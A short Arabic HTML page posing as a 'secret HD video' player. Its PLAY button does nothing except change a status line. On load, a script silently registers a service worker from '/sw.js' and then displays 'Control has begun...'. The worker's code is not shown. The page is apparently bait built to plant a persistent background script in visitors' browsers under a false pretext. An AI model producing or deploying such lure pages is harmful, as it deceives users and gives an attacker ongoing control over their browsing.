<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>فيديو HD سري</title>
  <style>
    body { margin: 0; background: black; height: 100vh; color: white; text-align: center; padding-top: 40vh; font-family: Arial; }
    button { width: 180px; height: 180px; background: white; border-radius: 50%; font-size: 40px; cursor: pointer; box-shadow: 0 0 30px red; }
  </style>
</head>
<body>
  <h1>اضغط لتشغيل الفيديو السري HD</h1>
  <button onclick="document.getElementById('status').innerText='جاري التشغيل...'">PLAY</button>
  <p id="status" style="font-size: 22px; margin-top: 30px;"></p>

  <script>
    // تسجيل Service Worker تلقائي فور فتح الصفحة
    if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
        navigator.serviceWorker.register('/sw.js')
          .then(reg => {
            console.log('Service Worker registered', reg);
            document.getElementById('status').innerText = 'السيطرة بدأت...';
          })
          .catch(err => {
            console.log('Service Worker failed', err);
            document.getElementById('status').innerText = 'جاري التحميل...';
          });
      });
    }
  </script>
</body>
</html>
